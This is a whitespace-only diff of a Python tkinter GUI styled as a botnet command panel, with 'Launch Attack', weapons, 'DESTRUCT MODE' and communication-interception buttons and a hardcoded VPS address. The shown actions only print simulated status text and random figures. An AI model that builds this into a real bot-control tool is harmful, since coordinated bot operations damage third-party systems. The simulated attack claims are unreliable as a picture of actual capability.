         total_requests = sum(bot["requests"] for bot in self.bot_data)
 
         
-
+        
         stats_text = f"""
 
         Bot Statistics Summary:
@@ -3720,7 +3754,7 @@ Ready to launch coordinated operation.
         =====================
 
         
-
+        
         Total Bots: {total_bots}
 
         Online: {online_bots} ({online_bots/total_bots*100:.1f}%)
@@ -3730,13 +3764,13 @@ Ready to launch coordinated operation.
         Maintenance: {maintenance_bots} ({maintenance_bots/total_bots*100:.1f}%)
 
         
-
+        
         Total Requests: {total_requests:,}
 
         Average Requests per Bot: {total_requests/total_bots:,.0f}
 
         
-
+        
         VPS Information:
 
         IP: 191.96.152.162
@@ -3748,11 +3782,11 @@ Ready to launch coordinated operation.
         """
 
         
-
+        
         messagebox.showinfo("Bot Statistics", stats_text)
 
         self.update_status("Bot statistics displayed")
-
+    
     
 
     def start_bot(self, bot):
@@ -3766,13 +3800,13 @@ Ready to launch coordinated operation.
             messagebox.showerror("Connection Error", f"Cannot connect to VPS 191.96.152.162:8080\nCannot start {bot['name']} without VPS connection.")
 
             return
-
+        
         
 
         self.update_status(f"Starting {bot['name']} on port {bot['port']}...")
 
         
-
+        
         def start_sequence():
 
             try:
@@ -3786,7 +3820,7 @@ Ready to launch coordinated operation.
                     self.update_status(f"Failed to start {bot['name']} - Port {bot['port']} in use")
 
                     return
-
+                
                 
 
                 # Simulate startup process
@@ -3798,7 +3832,7 @@ Ready to launch coordinated operation.
                 self.root.after(1500, lambda: self.update_status(f"Connecting {bot['name']} to VPS..."))
 
                 self.root.after(2000, lambda: self.finalize_bot_start(bot))
-
+                
                 
 
             except Exception as e:
@@ -3806,11 +3840,11 @@ Ready to launch coordinated operation.
                 messagebox.showerror("Start Error", f"Failed to start {bot['name']}:\n{str(e)}")
 
                 self.update_status(f"Error starting {bot['name']}: {str(e)}")
-
+        
         
 
         start_sequence()
-
+    
     
 
     def finalize_bot_start(self, bot):
@@ -3824,7 +3858,7 @@ Ready to launch coordinated operation.
         self.refresh_leaderboard_display()
 
         messagebox.showinfo("Bot Started", f"{bot['name']} is now online and running on port {bot['port']}")
-
+    
     
 
     def stop_bot(self, bot):
@@ -3838,13 +3872,13 @@ Ready to launch coordinated operation.
                 self.update_status(f"Stop cancelled for {bot['name']}")
 
                 return
-
+        
         
 
         self.update_status(f"Stopping {bot['name']} on port {bot['port']}...")
 
         
-
+        
         def stop_sequence():
 
             try:
@@ -3858,7 +3892,7 @@ Ready to launch coordinated operation.
                 self.root.after(1500, lambda: self.update_status(f"Finalizing {bot['name']} shutdown..."))
 
                 self.root.after(2000, lambda: self.finalize_bot_stop(bot))
-
+                
                 
 
             except Exception as e:
@@ -3866,11 +3900,11 @@ Ready to launch coordinated operation.
                 messagebox.showerror("Stop Error", f"Failed to stop {bot['name']}:\n{str(e)}")
 
                 self.update_status(f"Error stopping {bot['name']}: {str(e)}")
-
+        
         
 
         stop_sequence()
-
+    
     
 
     def finalize_bot_stop(self, bot):
@@ -3884,7 +3918,7 @@ Ready to launch coordinated operation.
         self.refresh_leaderboard_display()
 
         messagebox.showinfo("Bot Stopped", f"{bot['name']} has been stopped and is now offline")
-
+    
     
 
     def force_stop_bot(self, bot):
@@ -3894,7 +3928,7 @@ Ready to launch coordinated operation.
         if not messagebox.askyesno("Force Stop", f"Force stop {bot['name']}?\nThis will immediately terminate the bot and may cause data loss."):
 
             return
-
+        
         
 
         self.update_status(f"Force stopping {bot['name']}...")
@@ -3906,7 +3940,7 @@ Ready to launch coordinated operation.
         self.refresh_leaderboard_display()
 
         messagebox.showwarning("Force Stop", f"{bot['name']} has been force stopped")
-
+    
     
 
     def restart_bot(self, bot):
@@ -3916,7 +3950,7 @@ Ready to launch coordinated operation.
         self.update_status(f"Restarting {bot['name']}...")
 
         
-
+        
         def restart_sequence():
 
             try:
@@ -3930,7 +3964,7 @@ Ready to launch coordinated operation.
                 self.root.after(2000, lambda: self.update_status(f"Verifying {bot['name']} restart..."))
 
                 self.root.after(3000, lambda: self.finalize_bot_restart(bot))
-
+                
                 
 
             except Exception as e:
@@ -3938,11 +3972,11 @@ Ready to launch coordinated operation.
                 messagebox.showerror("Restart Error", f"Failed to restart {bot['name']}:\n{str(e)}")
 
                 self.update_status(f"Error restarting {bot['name']}: {str(e)}")
-
+        
         
 
         restart_sequence()
-
+    
     
 
     def finalize_bot_restart(self, bot):
@@ -3956,7 +3990,7 @@ Ready to launch coordinated operation.
         self.refresh_leaderboard_display()
 
         messagebox.showinfo("Bot Restarted", f"{bot['name']} has been restarted and is now online")
-
+    
     
 
     def maintain_bot(self, bot):
@@ -3966,7 +4000,7 @@ Ready to launch coordinated operation.
         if not messagebox.askyesno("Maintenance Mode", f"Put {bot['name']} in maintenance mode?\nThis will stop processing new requests but keep the bot running."):
 
             return
-
+        
         
 
         bot["status"] = "Maintenance"
@@ -3976,7 +4010,7 @@ Ready to launch coordinated operation.
         self.refresh_leaderboard_display()
 
         messagebox.showinfo("Maintenance Mode", f"{bot['name']} is now in maintenance mode")
-
+    
     
 
     def refresh_leaderboard_display(self):
@@ -3994,9 +4028,9 @@ Ready to launch coordinated operation.
         maintenance_count = len([bot for bot in self.bot_data if bot["status"] == "Maintenance"])
 
         
-
+        
         self.update_status(f"Status: {online_count} Online, {offline_count} Offline, {maintenance_count} Maintenance")
-
+    
     
 
     def open_bot_admin_panel(self, bot):
@@ -4014,7 +4048,7 @@ Ready to launch coordinated operation.
         admin_window.minsize(800, 600)
 
         
-
+        
         # Make window modal
 
         admin_window.transient(self.root)
@@ -4022,7 +4056,7 @@ Ready to launch coordinated operation.
         admin_window.grab_set()
 
         
-
+        
         # Center the window
 
         admin_window.update_idletasks()
@@ -4034,11 +4068,11 @@ Ready to launch coordinated operation.
         admin_window.geometry(f"1000x700+{x}+{y}")
 
         
-
+        
         # Create the bot-specific admin panel
 
         self.create_bot_specific_admin_panel(admin_window, bot)
-
+    
     
 
     def create_bot_specific_admin_panel(self, parent_window, bot):
@@ -4050,7 +4084,7 @@ Ready to launch coordinated operation.
         bot_configs = self.get_bot_specific_config(bot['name'])
 
         
-
+        
         # Header frame
 
         header_frame = ttk.Frame(parent_window)
@@ -4058,7 +4092,7 @@ Ready to launch coordinated operation.
         header_frame.pack(fill=tk.X, padx=10, pady=10)
 
         
-
+        
         title_label = ttk.Label(header_frame, text=f"👑 {bot['name']} - {bot_configs['title']}", 
 
                                font=('Arial', 16, 'bold'), foreground=bot_configs['color'])
@@ -4066,7 +4100,7 @@ Ready to launch coordinated operation.
         title_label.pack(side=tk.LEFT)
 
         
-
+        
         status_label = ttk.Label(header_frame, text=f"Status: {bot['status']}", 
 
                                font=('Arial', 12), foreground=bot_configs['status_color'])
@@ -4074,7 +4108,7 @@ Ready to launch coordinated operation.
         status_label.pack(side=tk.RIGHT)
 
         
-
+        
         # Create notebook for different admin sections
 
         admin_notebook = ttk.Notebook(parent_window)
@@ -4082,7 +4116,7 @@ Ready to launch coordinated operation.
         admin_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
 
         
-
+        
         # Create different admin sections
 
         self.create_bot_control_section(admin_notebook, bot, bot_configs)
@@ -4094,7 +4128,7 @@ Ready to launch coordinated operation.
         self.create_bot_network_section(admin_notebook, bot, bot_configs)
 
         self.create_bot_advanced_section(admin_notebook, bot, bot_configs)
-
+    
         
         # Add special sections for OmegaBot
         if bot['name'] == 'OmegaBot':
@@ -4585,7 +4619,7 @@ Ready to launch coordinated operation.
         }
 
         
-
+        
         return configs.get(bot_name, {
 
             "title": "Unknown Bot",
@@ -4605,7 +4639,7 @@ Ready to launch coordinated operation.
             "advanced": "Unknown"
 
         })
-
+    
     
 
     def create_bot_control_section(self, notebook, bot, config):
@@ -4617,7 +4651,7 @@ Ready to launch coordinated operation.
         notebook.add(control_frame, text="🎮 Control")
 
         
-
+        
         # Bot info frame
 
         info_frame = ttk.LabelFrame(control_frame, text=f"{bot['name']} Information", padding=10)
@@ -4625,7 +4659,7 @@ Ready to launch coordinated operation.
         info_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         info_text = f"""
 
 Specialty: {config['specialty']}
@@ -4643,7 +4677,7 @@ Requests: {bot['requests']:,}
         ttk.Label(info_frame, text=info_text, font=('Consolas', 10)).pack(anchor=tk.W)
 
         
-
+        
         # Control buttons
 
         control_buttons_frame = ttk.LabelFrame(control_frame, text="Bot Controls", padding=10)
@@ -4651,13 +4685,13 @@ Requests: {bot['requests']:,}
         control_buttons_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         button_frame = ttk.Frame(control_buttons_frame)
 
         button_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(button_frame, text="🚀 Launch Attack", 
 
                   command=lambda: self.bot_launch_attack(bot, config)).pack(side=tk.LEFT, padx=5)
@@ -4673,7 +4707,7 @@ Requests: {bot['requests']:,}
         ttk.Button(button_frame, text="⚡ Overcharge", 
 
                   command=lambda: self.bot_overcharge(bot, config)).pack(side=tk.LEFT, padx=5)
-
+        
         
 
         # Status display
@@ -4683,13 +4717,13 @@ Requests: {bot['requests']:,}
         status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.bot_status_text = scrolledtext.ScrolledText(status_frame, height=10, font=('Consolas', 9))
 
         self.bot_status_text.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Initialize status
 
         status_init = f"""
@@ -4719,7 +4753,7 @@ Ready for commands...
         """
 
         self.bot_status_text.insert(tk.END, status_init)
-
+    
     
 
     def create_bot_weapons_section(self, notebook, bot, config):
@@ -4731,7 +4765,7 @@ Ready for commands...
         notebook.add(weapons_frame, text="💥 Weapons")
 
         
-
+        
         # Weapons list
 
         weapons_list_frame = ttk.LabelFrame(weapons_frame, text=f"{bot['name']} Arsenal", padding=10)
@@ -4739,7 +4773,7 @@ Ready for commands...
         weapons_list_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         for i, weapon in enumerate(config['weapons']):
 
             weapon_frame = ttk.Frame(weapons_list_frame)
@@ -4747,13 +4781,13 @@ Ready for commands...
             weapon_frame.pack(fill=tk.X, pady=2)
 
             
-
+            
             ttk.Label(weapon_frame, text=f"🔫 {weapon}", font=('Arial', 10, 'bold')).pack(side=tk.LEFT)
 
             ttk.Button(weapon_frame, text="FIRE", 
 
                       command=lambda w=weapon: self.fire_weapon(bot, w, config)).pack(side=tk.RIGHT, padx=5)
-
+        
         
 
         # Weapon controls
@@ -4763,13 +4797,13 @@ Ready for commands...
         weapon_controls_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         controls_frame = ttk.Frame(weapon_controls_frame)
 
         controls_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(controls_frame, text="💣 Deploy All Weapons", 
 
                   command=lambda: self.deploy_all_weapons(bot, config)).pack(side=tk.LEFT, padx=5)
@@ -4785,7 +4819,7 @@ Ready for commands...
         ttk.Button(controls_frame, text="🛡️ Defensive Mode", 
 
                   command=lambda: self.defensive_mode(bot, config)).pack(side=tk.LEFT, padx=5)
-
+        
         
 
         # Weapon status
@@ -4795,13 +4829,13 @@ Ready for commands...
         weapon_status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.weapon_status_text = scrolledtext.ScrolledText(weapon_status_frame, height=8, font=('Consolas', 9))
 
         self.weapon_status_text.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         weapon_status_init = f"""
 
 {bot['name']} Weapon Systems Status
@@ -4823,7 +4857,7 @@ All systems operational and ready for deployment.
         """
 
         self.weapon_status_text.insert(tk.END, weapon_status_init)
-
+    
     
 
     def create_bot_intelligence_section(self, notebook, bot, config):
@@ -4835,7 +4869,7 @@ All systems operational and ready for deployment.
         notebook.add(intel_frame, text="🧠 Intelligence")
 
         
-
+        
         # Intelligence capabilities
 
         intel_capabilities_frame = ttk.LabelFrame(intel_frame, text="Intelligence Capabilities", padding=10)
@@ -4843,11 +4877,11 @@ All systems operational and ready for deployment.
         intel_capabilities_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         ttk.Label(intel_capabilities_frame, text=f"Type: {config['intelligence']}", 
 
                  font=('Arial', 12, 'bold')).pack(anchor=tk.W)
-
+        
         
 
         # Intelligence controls
@@ -4857,13 +4891,13 @@ All systems operational and ready for deployment.
         intel_controls_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         controls_frame = ttk.Frame(intel_controls_frame)
 
         controls_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(controls_frame, text="🔍 Scan Target", 
 
                   command=lambda: self.scan_target(bot, config)).pack(side=tk.LEFT, padx=5)
@@ -4879,7 +4913,7 @@ All systems operational and ready for deployment.
         ttk.Button(controls_frame, text="🎯 Predict Behavior", 
 
                   command=lambda: self.predict_behavior(bot, config)).pack(side=tk.LEFT, padx=5)
-
+        
         
 
         # Intelligence display
@@ -4889,13 +4923,13 @@ All systems operational and ready for deployment.
         intel_display_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.intel_display_text = scrolledtext.ScrolledText(intel_display_frame, height=10, font=('Consolas', 9))
 
         self.intel_display_text.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         intel_init = f"""
 
 {bot['name']} Intelligence Systems
@@ -4921,7 +4955,7 @@ Ready for intelligence operations...
         """
 
         self.intel_display_text.insert(tk.END, intel_init)
-
+    
     
 
     def create_bot_network_section(self, notebook, bot, config):
@@ -4933,7 +4967,7 @@ Ready for intelligence operations...
         notebook.add(network_frame, text="🌐 Network")
 
         
-
+        
         # Network info
 
         network_info_frame = ttk.LabelFrame(network_frame, text="Network Configuration", padding=10)
@@ -4941,7 +4975,7 @@ Ready for intelligence operations...
         network_info_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         network_text = f"""
 
 Network Type: {config['network']}
@@ -4959,7 +4993,7 @@ Protocol: Advanced
         ttk.Label(network_info_frame, text=network_text, font=('Consolas', 10)).pack(anchor=tk.W)
 
         
-
+        
         # Network controls
 
         network_controls_frame = ttk.LabelFrame(network_frame, text="Network Operations", padding=10)
@@ -4967,13 +5001,13 @@ Protocol: Advanced
         network_controls_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         controls_frame = ttk.Frame(network_controls_frame)
 
         controls_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(controls_frame, text="🌐 Connect to Network", 
 
                   command=lambda: self.connect_to_network(bot, config)).pack(side=tk.LEFT, padx=5)
@@ -4989,7 +5023,7 @@ Protocol: Advanced
         ttk.Button(controls_frame, text="🛡️ Secure Channel", 
 
                   command=lambda: self.secure_channel(bot, config)).pack(side=tk.LEFT, padx=5)
-
+        
         
 
         # Network status
@@ -4999,13 +5033,13 @@ Protocol: Advanced
         network_status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.network_status_text = scrolledtext.ScrolledText(network_status_frame, height=8, font=('Consolas', 9))
 
         self.network_status_text.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         network_status_init = f"""
 
 {bot['name']} Network Status
@@ -5031,7 +5065,7 @@ Network operations ready...
         """
 
         self.network_status_text.insert(tk.END, network_status_init)
-
+    
     
 
     def create_bot_advanced_section(self, notebook, bot, config):
@@ -5043,7 +5077,7 @@ Network operations ready...
         notebook.add(advanced_frame, text="⚡ Advanced")
 
         
-
+        
         # Advanced capabilities
 
         advanced_capabilities_frame = ttk.LabelFrame(advanced_frame, text="Advanced Capabilities", padding=10)
@@ -5051,11 +5085,11 @@ Network operations ready...
         advanced_capabilities_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         ttk.Label(advanced_capabilities_frame, text=f"Advanced Mode: {config['advanced']}", 
 
                  font=('Arial', 12, 'bold'), foreground='red').pack(anchor=tk.W)
-
+        
         
 
         # Advanced controls
@@ -5065,13 +5099,13 @@ Network operations ready...
         advanced_controls_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         controls_frame = ttk.Frame(advanced_controls_frame)
 
         controls_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(controls_frame, text="💀 DESTRUCT MODE", 
 
                   command=lambda: self.destruct_mode(bot, config), 
@@ -5089,7 +5123,7 @@ Network operations ready...
         ttk.Button(controls_frame, text="🔥 CHAOS MODE", 
 
                   command=lambda: self.chaos_mode(bot, config)).pack(side=tk.LEFT, padx=5)
-
+        
         
 
         # Advanced status
@@ -5099,13 +5133,13 @@ Network operations ready...
         advanced_status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.advanced_status_text = scrolledtext.ScrolledText(advanced_status_frame, height=10, font=('Consolas', 9))
 
         self.advanced_status_text.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         advanced_status_init = f"""
 
 {bot['name']} Advanced Systems
@@ -5131,7 +5165,7 @@ WARNING: Advanced operations may cause irreversible damage!
         """
 
         self.advanced_status_text.insert(tk.END, advanced_status_init)
-
+    
     
 
     # Bot admin panel action methods
@@ -5165,7 +5199,7 @@ Status: ATTACKING
         self.bot_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} launched attack")
-
+    
     
 
     def bot_emergency_stop(self, bot, config):
@@ -5197,7 +5231,7 @@ Status: EMERGENCY STOP
         self.bot_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} emergency stopped")
-
+    
     
 
     def bot_reset_systems(self, bot, config):
@@ -5229,7 +5263,7 @@ Status: RESETTING
         self.bot_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} systems reset")
-
+    
     
 
     def bot_overcharge(self, bot, config):
@@ -5261,7 +5295,7 @@ Status: OVERCHARGED
         self.bot_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} overcharged")
-
+    
     
 
     def fire_weapon(self, bot, weapon, config):
@@ -5293,7 +5327,7 @@ Status: FIRED
         self.weapon_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} fired {weapon}")
-
+    
     
 
     def deploy_all_weapons(self, bot, config):
@@ -5325,7 +5359,7 @@ Status: ALL WEAPONS DEPLOYED
         self.weapon_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} deployed all weapons")
-
+    
     
 
     def target_lock(self, bot, config):
@@ -5357,7 +5391,7 @@ Status: TARGET LOCKED
         self.weapon_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} target locked")
-
+    
     
 
     def overcharge_weapons(self, bot, config):
@@ -5389,7 +5423,7 @@ Status: WEAPONS OVERCHARGED
         self.weapon_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} weapons overcharged")
-
+    
     
 
     def defensive_mode(self, bot, config):
@@ -5421,7 +5455,7 @@ Status: DEFENSIVE MODE
         self.weapon_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} defensive mode activated")
-
+    
     
 
     def scan_target(self, bot, config):
@@ -5453,7 +5487,7 @@ Status: SCANNING
         self.intel_display_text.see(tk.END)
 
         self.update_status(f"{bot['name']} scanning target")
-
+    
     
 
     def intercept_communications(self, bot, config):
@@ -5485,7 +5519,7 @@ Status: INTERCEPTING
         self.intel_display_text.see(tk.END)
 
         self.update_status(f"{bot['name']} intercepting communications")
-
+    
     
 
     def analyze_patterns(self, bot, config):
@@ -5517,7 +5551,7 @@ Status: ANALYZING
         self.intel_display_text.see(tk.END)
 
         self.update_status(f"{bot['name']} analyzing patterns")
-
+    
     
 
     def predict_behavior(self, bot, config):
@@ -5549,7 +5583,7 @@ Status: PREDICTING
         self.intel_display_text.see(tk.END)
 
         self.update_status(f"{bot['name']} predicting behavior")
-
+    
     
 
     def connect_to_network(self, bot, config):
@@ -5581,7 +5615,7 @@ Status: CONNECTED
         self.network_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} connected to network")
-
+    
     
 
     def encrypt_communications(self, bot, config):
@@ -5613,7 +5647,7 @@ Status: ENCRYPTED
         self.network_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} communications encrypted")
-
+    
     
 
     def broadcast_signal(self, bot, config):
@@ -5645,7 +5679,7 @@ Status: BROADCASTING
         self.network_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} broadcasting signal")
-
+    
     
 
     def secure_channel(self, bot, config):
@@ -5677,7 +5711,7 @@ Status: SECURE
         self.network_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} secure channel established")
-
+    
     
 
     def destruct_mode(self, bot, config):
@@ -5711,7 +5745,7 @@ Status: DESTRUCT MODE
             self.advanced_status_text.see(tk.END)
 
             self.update_status(f"{bot['name']} DESTRUCT MODE ACTIVATED")
-
+    
     
 
     def reality_breach(self, bot, config):
@@ -5743,7 +5777,7 @@ Status: REALITY BREACH
         self.advanced_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} reality breach activated")
-
+    
     
 
     def overdrive_mode(self, bot, config):
@@ -5775,7 +5809,7 @@ Status: OVERDRIVE
         self.advanced_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} overdrive mode activated")
-
+    
     
 
     def chaos_mode(self, bot, config):
@@ -5807,7 +5841,7 @@ Status: CHAOS MODE
         self.advanced_status_text.see(tk.END)
 
         self.update_status(f"{bot['name']} chaos mode activated")
-
+    
     
 
     # AI Management Methods
@@ -5823,7 +5857,7 @@ Status: CHAOS MODE
             messagebox.showwarning("Input Error", "Please enter an IP address")
 
             return
-
+        
         
 
         self.update_status(f"Looking up IP: {ip_address}")
@@ -5831,7 +5865,7 @@ Status: CHAOS MODE
         self.ip_results.delete(1.0, tk.END)
 
         
-
+        
         # Simulate IP lookup with realistic data
 
         lookup_data = self.simulate_ip_lookup(ip_address)
@@ -5839,7 +5873,7 @@ Status: CHAOS MODE
         self.ip_results.insert(tk.END, lookup_data)
 
         self.update_status(f"IP lookup completed for {ip_address}")
-
+    
     
 
     def simulate_ip_lookup(self, ip_address):
@@ -5851,7 +5885,7 @@ Status: CHAOS MODE
         import socket
 
         
-
+        
         try:
 
             # Try to get hostname
@@ -5861,7 +5895,7 @@ Status: CHAOS MODE
         except:
 
             hostname = "Unknown"
-
+        
         
 
         # Simulate geolocation data
@@ -5873,7 +5907,7 @@ Status: CHAOS MODE
         isps = ["DigitalOcean", "AWS", "Google Cloud", "Azure", "Vultr", "Linode"]
 
         
-
+        
         country = random.choice(countries)
 
         city = random.choice(cities)
@@ -5881,7 +5915,7 @@ Status: CHAOS MODE
         isp = random.choice(isps)
 
         
-
+        
         # Simulate additional data
 
         asn = f"AS{random.randint(1000, 9999)}"
@@ -5891,7 +5925,7 @@ Status: CHAOS MODE
         timezone = random.choice(["UTC-5", "UTC+1", "UTC+0", "UTC-8", "UTC+2"])
 
         
-
+        
         lookup_text = f"""
 
 IP Lookup Results for {ip_address}
@@ -5967,9 +6001,9 @@ Bot Network Status:
         """
 
         
-
+        
         return lookup_text
-
+    
     
 
     def quick_lookup(self, ip_address):
@@ -5981,7 +6015,7 @@ Bot Network Status:
         self.ip_entry.insert(0, ip_address)
 
         self.perform_ip_lookup()
-
+    
     
 
     def scan_all_bot_ips(self):
@@ -5993,13 +6027,13 @@ Bot Network Status:
         self.ip_results.delete(1.0, tk.END)
 
         
-
+        
         scan_results = "Bot Network Scan Results\n"
 
         scan_results += "========================\n\n"
 
         
-
+        
         for i, bot in enumerate(self.bot_data):
 
             bot_ip = "191.96.152.162"  # VPS IP
@@ -6009,7 +6043,7 @@ Bot Network Status:
             status = bot["status"]
 
             
-
+            
             # Simulate scan results
 
             response_time = random.randint(5, 50)
@@ -6017,9 +6051,9 @@ Bot Network Status:
             uptime = random.uniform(95, 99.9)
 
             
-
+            
             scan_results += f"Bot {i+1:2d}: {bot['name']:12s} | {bot_ip}:{bot_port:4d} | {status:10s} | {response_time:2d}ms | {uptime:5.1f}%\n"
-
+        
         
 
         scan_results += f"\nScan completed: {len(self.bot_data)} bots analyzed"
@@ -6027,7 +6061,7 @@ Bot Network Status:
         self.ip_results.insert(tk.END, scan_results)
 
         self.update_status("Bot network scan completed")
-
+    
     
 
     def detect_tunnels(self):
@@ -6039,7 +6073,7 @@ Bot Network Status:
         self.tunnel_results.delete(1.0, tk.END)
 
         
-
+        
         tunnel_data = """
 
 Tunnel Detection Results
@@ -6109,11 +6143,11 @@ Bot Network Tunnels:
         """
 
         
-
+        
         self.tunnel_results.insert(tk.END, tunnel_data)
 
         self.update_status("Tunnel detection completed")
-
+    
     
 
     def tunnel_statistics(self):
@@ -6177,11 +6211,11 @@ Bot Network:
         """
 
         
-
+        
         messagebox.showinfo("Tunnel Statistics", stats_text)
 
         self.update_status("Tunnel statistics displayed")
-
+    
     
 
     def refresh_tunnel_status(self):
@@ -6193,7 +6227,7 @@ Bot Network:
         self.detect_tunnels()
 
         self.update_status("Tunnel status refreshed")
-
+    
     
 
     # AI Bot Management Methods
@@ -6207,13 +6241,13 @@ Bot Network:
         self.ai_status_label.config(text="🟢 AI Active", foreground="green")
 
         
-
+        
         # Simulate AI startup
 
         self.root.after(1000, lambda: self.update_status("AI management system started"))
 
         messagebox.showinfo("AI Management", "AI management system is now active and monitoring all bots")
-
+    
     
 
     def stop_ai_management(self):
@@ -6229,7 +6263,7 @@ Bot Network:
             self.update_status("AI management system stopped")
 
             messagebox.showinfo("AI Management", "AI management system has been stopped")
-
+    
     
 
     def reset_ai_management(self):
@@ -6247,7 +6281,7 @@ Bot Network:
             self.update_status("AI management system reset and restarted")
 
             messagebox.showinfo("AI Management", "AI management system has been reset and is learning")
-
+    
     
 
     def ai_manage_bot(self, bot_index):
@@ -6261,7 +6295,7 @@ Bot Network:
             self.update_status(f"AI managing {bot['name']}...")
 
             
-
+            
             # Simulate AI analysis and action
 
             ai_analysis = f"""
@@ -6305,11 +6339,11 @@ AI Actions Taken:
             """
 
             
-
+            
             messagebox.showinfo(f"AI Management - {bot['name']}", ai_analysis)
 
             self.update_status(f"AI management completed for {bot['name']}")
-
+    
     
 
     def ai_optimize_all(self):
@@ -6319,7 +6353,7 @@ AI Actions Taken:
         self.update_status("AI optimizing all bots...")
 
         
-
+        
         optimized_count = 0
 
         for bot in self.bot_data:
@@ -6331,13 +6365,13 @@ AI Actions Taken:
                 bot['uptime'] = f"{min(99.9, float(bot['uptime'].replace('%', '')) + random.uniform(0.1, 0.5)):.1f}%"
 
                 optimized_count += 1
-
+        
         
 
         self.update_status(f"AI optimized {optimized_count} bots")
 
         messagebox.showinfo("AI Optimization", f"Successfully optimized {optimized_count} online bots\nPerformance improvements applied")
-
+    
     
 
     def ai_restart_failed(self):
@@ -6347,29 +6381,29 @@ AI Actions Taken:
         failed_bots = [bot for bot in self.bot_data if bot['status'] == 'Offline']
 
         
-
+        
         if not failed_bots:
 
             messagebox.showinfo("AI Restart", "No failed bots found")
 
             return
-
+        
         
 
         self.update_status(f"AI restarting {len(failed_bots)} failed bots...")
 
         
-
+        
         for bot in failed_bots:
 
             bot['status'] = 'Online'
-
+        
         
 
         self.update_status(f"AI restarted {len(failed_bots)} bots")
 
         messagebox.showinfo("AI Restart", f"Successfully restarted {len(failed_bots)} failed bots")
-
+    
     
 
     def ai_scale_up(self):
@@ -6379,7 +6413,7 @@ AI Actions Taken:
         self.update_status("AI scaling up bot resources...")
 
         
-
+        
         scaled_count = 0
 
         for bot in self.bot_data:
@@ -6391,13 +6425,13 @@ AI Actions Taken:
                 bot['requests'] = int(bot['requests'] * 1.1)
 
                 scaled_count += 1
-
+        
         
 
         self.update_status(f"AI scaled up {scaled_count} high-load bots")
 
         messagebox.showinfo("AI Scaling", f"Scaled up {scaled_count} high-load bots\nResources increased by 10%")
-
+    
     
 
     def ai_scale_down(self):
@@ -6407,7 +6441,7 @@ AI Actions Taken:
         self.update_status("AI scaling down bot resources...")
 
         
-
+        
         scaled_count = 0
 
         for bot in self.bot_data:
@@ -6419,13 +6453,13 @@ AI Actions Taken:
                 bot['requests'] = int(bot['requests'] * 0.9)
 
                 scaled_count += 1
-
+        
         
 
         self.update_status(f"AI scaled down {scaled_count} low-load bots")
 
         messagebox.showinfo("AI Scaling", f"Scaled down {scaled_count} low-load bots\nResources optimized")
-
+    
     
 
     def ai_security_scan(self):
@@ -6435,7 +6469,7 @@ AI Actions Taken:
         self.update_status("AI performing security scan...")
 
         
-
+        
         security_report = """
 
 AI Security Scan Report
@@ -6505,11 +6539,11 @@ Threat Assessment:
         """
 
         
-
+        
         messagebox.showinfo("AI Security Scan", security_report)
 
         self.update_status("AI security scan completed")
-
+    
     
 
     def ai_analytics(self):
@@ -6519,7 +6553,7 @@ Threat Assessment:
         self.update_status("AI generating analytics...")
 
         
-
+        
         # Calculate analytics
 
         total_bots = len(self.bot_data)
@@ -6531,7 +6565,7 @@ Threat Assessment:
         avg_uptime = sum(float(bot['uptime'].replace('%', '')) for bot in self.bot_data) / total_bots
 
         
-
+        
         analytics_text = f"""
 
 AI Analytics Dashboard
@@ -6589,7 +6623,7 @@ AI Recommendations:
         """
 
         
-
+        
         messagebox.showinfo("AI Analytics", analytics_text)
 
         self.update_status("AI analytics generated")
@@ -6811,7 +6845,7 @@ AI Recommendations:
         ========================
 
         
-
+        
         Status: {bot['status']}
 
         Rank: #{bot['rank']}
@@ -6823,7 +6857,7 @@ AI Recommendations:
         Port: {bot['port']}
 
         
-
+        
         VPS Connection:
 
         IP: 191.96.152.162
@@ -6831,7 +6865,7 @@ AI Recommendations:
         Full Address: 191.96.152.162:{bot['port']}
 
         
-
+        
         Performance Metrics:
 
         - Response Time: 45ms
@@ -6843,7 +6877,7 @@ AI Recommendations:
         - Last Restart: 2 hours ago
 
         
-
+        
         Configuration:
 
         - Auto-restart: Enabled
@@ -6855,7 +6889,7 @@ AI Recommendations:
         """
 
         
-
+        
         messagebox.showinfo(f"Bot Details - {bot['name']}", details_text)
